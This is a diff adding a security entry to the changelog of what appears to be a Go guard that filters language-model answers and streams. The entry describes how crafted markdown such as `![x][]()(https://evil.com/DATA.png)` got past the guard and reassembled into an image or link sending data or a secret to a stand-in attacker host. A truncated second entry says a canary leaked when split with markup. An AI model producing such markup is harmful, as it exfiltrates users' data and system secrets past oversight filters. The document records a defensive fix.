@@ -58,6 +58,37 @@ Before 1.0, minor versions may contain breaking changes; they are listed under
 
 ### Security
 
+- The output guard could let an image or link to a host off the allowlist
+  through (v0.3.0 and earlier, whole answers and streams) when removing
+  markup joined what was around it into new markup that it never checked:
+  `![x][]()(https://evil.com/DATA.png)` and `![x][(](z)https://evil.com/DATA.png)`
+  came out as `![x](https://evil.com/DATA.png)`, an image that loads with no
+  click; `https://evil.com/x[](y).png?d=SECRET` as a bare image URL with a
+  query; and `![a](…)(https://evil.com/?q=S)` as
+  `[REDACTED:image](https://evil.com/?q=S)`, a link, since a marker followed
+  by `(…)` is link text (the same with any marker, such as an e-mail's, and
+  `[REDACTED:image]: https://…` at a line start made every such marker in
+  the answer a link). The guard now checks what it produced again, with the
+  same rules, while the previous pass changed something: up to three times,
+  and markup nested deeper than that ends the answer with a marker. A
+  stream holds back what a change may still join until it knows what
+  follows, and still sends exactly what the whole-answer guard produces.
+  What the text of a removed link holds (a URL, an `<img>` tag) is now
+  checked too. Bare URLs are read as GitHub's markdown reads them: brackets,
+  parentheses and quotes are part of the URL (so `https://evil.com/x[1].png?d=…` is
+  an image URL with a query) but a control character ends it, a bad escape
+  (`%zz`) no longer makes the guard keep it, and a URL is checked from every
+  place one starts, so one running on into another no longer hides it. Link and
+  reference definition URLs are read as lenient renderers (goldmark among
+  them) read them, not only as CommonMark allows: parentheses nested to any
+  depth or left open (`[t](https://evil.com/(x "t")`), backslash escapes,
+  `<` and `>`. An `<img>` tag runs from the first `<img` to the next `>` in a
+  stream as in a whole answer. Tests parse the guarded output with a
+  CommonMark parser (goldmark, GitHub extensions; test-only dependency) and
+  fail on any image, link, autolink or `<img>` to a host the guard removes.
+  On the Go benchmarks (2 KB answer, Apple M3 Max) a clean answer takes
+  0.8 µs more (0.009 ms whole, 0.015 ms streamed), one with findings 27 to
+  33% less (0.20 and 0.27 ms); streams stay under twice the whole answer.
 - The canary could leak through the output guard (v0.3.0 and earlier, whole
   answers and streams) when the model split it with markup that the guard
   removes: in `PS-CANARY-0123[]()4567…` the empty link was removed and the
